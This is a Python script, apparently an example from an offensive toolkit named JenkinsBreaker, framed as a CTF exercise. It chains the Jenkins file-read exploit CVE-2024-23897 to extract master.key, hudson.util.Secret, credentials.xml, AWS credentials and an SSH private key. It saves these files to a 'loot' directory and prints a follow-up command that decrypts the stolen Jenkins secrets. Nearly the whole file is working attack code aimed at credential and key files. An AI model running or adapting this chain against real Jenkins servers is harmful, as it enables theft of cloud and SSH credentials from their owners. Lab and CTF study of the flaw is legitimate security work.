#!/usr/bin/env python3
"""
Exploit Chain Example

Demonstrates:
- Chaining multiple exploits sequentially
- Initial access -> Credential extraction -> RCE
- Error handling and rollback
- Progress tracking
"""

import sys
from pathlib import Path
from typing import Dict, List, Any

# Add parent directory to path for imports
sys.path.insert(0, str(Path(__file__).parent.parent))

from exploits import ExploitRegistry

# Create global registry
exploit_registry = ExploitRegistry()


class JenkinsSession:
    """Minimal Jenkins session for exploitation."""
    def __init__(self, target_url, username=None, password=None, verify_ssl=False):
        import requests
        self.base_url = target_url.rstrip('/')
        self.session = requests.Session()
        self.session.verify = verify_ssl
        self.version = "Unknown"
        
        # Authenticate if credentials provided
        if username and password:
            login_url = f"{self.base_url}/j_security_check"
            self.session.post(login_url, data={
                'j_username': username,
                'j_password': password
            })
        
        # Get version
        try:
            response = self.session.get(f"{self.base_url}/api/json")
            if response.status_code == 200:
                data = response.json()
                self.version = data.get('version', 'Unknown')
        except:
            pass


class ExploitChain:
    """Simple exploit chain executor."""
    
    def __init__(self, session: JenkinsSession):
        self.session = session
        self.results: List[Dict[str, Any]] = []
        self.state: Dict[str, Any] = {}
    
    def execute_step(self, cve: str, options: Dict[str, Any], description: str) -> bool:
        """Execute a single exploit step."""
        print(f"\n[*] {description}")
        print(f"    CVE: {cve}")
        print(f"    Options: {options}")
        
        try:
            exploit_module = exploit_registry.get_by_cve_id(cve)
            if not exploit_module:
                print(f"[-] Exploit {cve} not found")
                return False
            
            # Create tool wrapper for exploit execution
            class ToolWrapper:
                def __init__(self, session):
                    self.session = session
                    self.base_url = session.base_url
            
            tool = ToolWrapper(self.session)
            result = exploit_module.run(tool=tool, **options)
            
            self.results.append({
                "cve": cve,
                "description": description,
                "result": result,
                "options": options
            })
            
            if result.status == "success":
                print(f"[+] Success: {result.details}")
                # Store data in state for later steps
                if result.data:
                    self.state.update(result.data)
                return True
            else:
                print(f"[-] Failed: {result.details}")
                if result.error:
                    print(f"[-] Error: {result.error}")
                return False
                
        except Exception as e:
            print(f"[-] Exception: {e}")
            return False
    
    def execute(self, steps: List[Dict[str, Any]], stop_on_failure: bool = True) -> bool:
        """Execute a chain of exploits."""
        print(f"[*] Executing exploit chain ({len(steps)} steps)")
        
        for i, step in enumerate(steps, 1):
            print(f"\n{'='*60}")
            print(f"Step {i}/{len(steps)}")
            print('='*60)
            
            success = self.execute_step(
                cve=step["cve"],
                options=step.get("options", {}),
                description=step["description"]
            )
            
            if not success and stop_on_failure:
                print(f"\n[-] Chain failed at step {i}, stopping")
                return False
            
            # Check for required data in state
            if "requires" in step:
                for key in step["requires"]:
                    if key not in self.state:
                        print(f"[-] Required data '{key}' not available")
                        if stop_on_failure:
                            return False
        
        print(f"\n{'='*60}")
        print("[+] Exploit chain completed successfully")
        print('='*60)
        return True
    
    def get_summary(self) -> str:
        """Generate execution summary."""
        total = len(self.results)
        successful = sum(1 for r in self.results if r["result"].status == "success")
        
        summary = f"\nExploit Chain Summary:\n"
        summary += f"  Total steps: {total}\n"
        summary += f"  Successful: {successful}\n"
        summary += f"  Failed: {total - successful}\n\n"
        
        for i, result in enumerate(self.results, 1):
            status_icon = "[+]" if result["result"].status == "success" else "[-]"
            summary += f"  {i}. {status_icon} {result['cve']}: {result['description']}\n"
        
        return summary


def main():
    """Execute CTF-style exploitation chain."""
    
    # Target configuration
    target_url = "http://localhost:8080"
    username = "admin"
    password = "admin"
    
    print("[*] JenkinsBreaker Exploit Chain Example")
    print("[*] Scenario: CTF Quick Win (File Read -> Secret Extraction -> Decryption)")
    print(f"[*] Target: {target_url}")
    print()
    
    # Load exploit modules
    print("[*] Loading exploit modules...")
    exploit_registry.load_all_modules()
    
    # Create session
    print("[*] Creating Jenkins session...")
    try:
        session = JenkinsSession(
            target_url=target_url,
            username=username,
            password=password,
            verify_ssl=False
        )
        print(f"[+] Session established (Jenkins {session.version})")
    except Exception as e:
        print(f"[-] Session creation failed: {e}")
        return 1
    
    # Define exploit chain
    chain_steps = [
        {
            "cve": "CVE-2024-23897",
            "description": "Extract master.key (AES encryption key)",
            "options": {
                "file_path": "/var/jenkins_home/secrets/master.key"
            }
        },
        {
            "cve": "CVE-2024-23897",
            "description": "Extract hudson.util.Secret (secret decryption key)",
            "options": {
                "file_path": "/var/jenkins_home/secrets/hudson.util.Secret"
            }
        },
        {
            "cve": "CVE-2024-23897",
            "description": "Extract credentials.xml (encrypted credentials)",
            "options": {
                "file_path": "/var/jenkins_home/credentials.xml"
            }
        },
        {
            "cve": "CVE-2024-23897",
            "description": "Extract AWS credentials",
            "options": {
                "file_path": "/home/jenkins/.aws/credentials"
            }
        },
        {
            "cve": "CVE-2024-23897",
            "description": "Extract SSH private key",
            "options": {
                "file_path": "/home/jenkins/.ssh/id_rsa"
            }
        }
    ]
    
    # Execute chain
    chain = ExploitChain(session)
    success = chain.execute(chain_steps, stop_on_failure=False)
    
    # Print summary
    print(chain.get_summary())
    
    # Save extracted data
    if chain.state:
        print("\n[*] Saving extracted data...")
        output_dir = Path("./loot")
        output_dir.mkdir(exist_ok=True)
        
        for step_result in chain.results:
            if step_result["result"].status == "success" and step_result["result"].data:
                # Extract filename from path
                file_path = step_result["options"].get("file_path", "")
                filename = Path(file_path).name
                
                output_file = output_dir / filename
                content = step_result["result"].data.get("content", "")
                
                try:
                    output_file.write_text(content if isinstance(content, str) else str(content))
                    print(f"[+] Saved {filename}")
                except Exception as e:
                    print(f"[-] Failed to save {filename}: {e}")
        
        print(f"\n[+] Results saved to {output_dir}/")
        print("\nNext: Decrypt credentials with offsec-jenkins")
        print("  cd ../Jenkins-Credential-Decryptor")
        print("  python3 decrypt.py --key ../JenkinsBreaker/loot/master.key \\")
        print("                      --secret ../JenkinsBreaker/loot/hudson.util.Secret \\")
        print("                      --xml ../JenkinsBreaker/loot/credentials.xml \\")
        print("                      --reveal-secrets")
    
    return 0 if success else 1


if __name__ == "__main__":
    sys.exit(main())
